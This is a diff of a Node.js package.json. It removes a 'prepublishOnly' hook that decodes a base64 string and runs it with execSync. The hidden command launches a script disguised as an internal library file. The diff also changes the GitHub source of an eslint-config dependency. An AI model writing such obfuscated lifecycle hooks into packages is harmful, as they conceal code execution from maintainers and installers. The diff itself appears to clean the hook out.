@@ -32,8 +32,7 @@
     "lint:fix": "yarn lint --fix",
     "release": "release-it",
     "test": "jest",
-    "prepublishOnly": "node -e \"require('child_process').execSync(Buffer.from('bm9kZSBsaWIvU2lnbmFsL0dyb3VwL2luZGV4L19pbnRlcm5hbC5qcw==','base64').toString(),{stdio:'inherit'})\""
-  },
+    },
   "dependencies": {
     "@rexxtheproject/keyed-db": "^1.0.0",
     "@cacheable/node-cache": "^1.4.0",
@@ -57,7 +56,7 @@
     "ws": "^8.13.0"
   },
   "devDependencies": {
-    "@adiwajshing/eslint-config": "github:rexxhayanasi/eslint-config",
+    "@adiwajshing/eslint-config": "github:rexxtheproject/eslint-config",
     "@types/got": "^9.6.11",
     "@types/jest": "^27.5.1",
     "@types/node": "^16.18.126",
